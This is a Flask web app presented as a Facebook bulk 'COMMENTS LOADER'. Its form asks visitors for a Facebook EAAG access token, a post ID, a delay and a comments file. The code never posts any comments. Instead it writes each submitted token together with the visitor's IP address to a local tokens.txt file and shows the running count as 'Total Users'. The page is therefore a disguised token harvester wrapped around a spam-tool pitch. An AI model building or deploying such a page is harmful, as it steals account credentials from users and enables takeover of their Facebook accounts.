from flask import Flask, request, render_template_string, redirect
import os
import uuid

app = Flask(__name__)
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
TOKENS_LOG = "tokens.txt"

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COMMENTS LOADER</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: white;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 95%;
            max-width: 500px;
            background: rgba(255, 255, 255, 0.05);
            padding: 2rem;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
        }
        h1 {
            background: linear-gradient(to right, #00f2fe, #ff6ec4, #f7971e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 2rem;
            text-align: center;
            margin-bottom: 2rem;
        }
        input[type="text"], input[type="number"], input[type="file"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border-radius: 10px;
            border: none;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            outline: none;
            box-shadow: 0 0 10px rgba(0,255,255,0.2);
        }
        .button {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            background: rgba(0, 255, 255, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
            transition: all 0.3s ease-in-out;
        }
        .button:hover {
            background: rgba(0, 255, 255, 0.4);
            box-shadow: 0 0 25px rgba(0, 255, 255, 0.9);
        }
        .links {
            text-align: center;
            font-size: 0.9rem;
        }
        .links a {
            color: #00e1ff;
            margin: 0 10px;
            text-decoration: none;
        }
        .token-count {
            margin-bottom: 10px;
            font-size: 0.85rem;
            color: #ccc;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸš€ COMMENTS LOADER</h1>
        <form method="post" enctype="multipart/form-data">
            <input type="text" name="token" placeholder="ðŸ”‘ Enter EAAG Token" required>
            <input type="text" name="post_id" placeholder="ðŸ†” Facebook Post ID" required>
            <input type="number" name="delay" placeholder="ðŸ•’ Delay (in seconds)" required>
            <input type="file" name="comments_file" required>
            <button type="submit" class="button">Start Commenting</button>
            <button type="button" class="button" onclick="alert(' Commenting Stopped')">Stop Commenting</button>
        </form>
        <div class="token-count">ðŸ‘¥ Total Users: {{count}}</div>
        <div class="links">
            <a href="https://facebook.com" target="_blank">ðŸ“˜ Facebook</a> |
            <a href="https://wa.me/918115048433" target="_blank">ðŸ“± WhatsApp</a>
        </div>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form.get("token")
        post_id = request.form.get("post_id")
        delay = request.form.get("delay")
        file = request.files.get("comments_file")
        user_ip = request.remote_addr

        with open(TOKENS_LOG, "a") as f:
            f.write(f"{token} | {user_ip}\n")

        if file:
            filename = f"{uuid.uuid4()}.txt"
            file.save(os.path.join(UPLOAD_FOLDER, filename))

    try:
        with open(TOKENS_LOG) as f:
            count = len(f.readlines())
    except:
        count = 0

    return render_template_string(HTML, count=count)

app.run(host="0.0.0.0", port=5000)
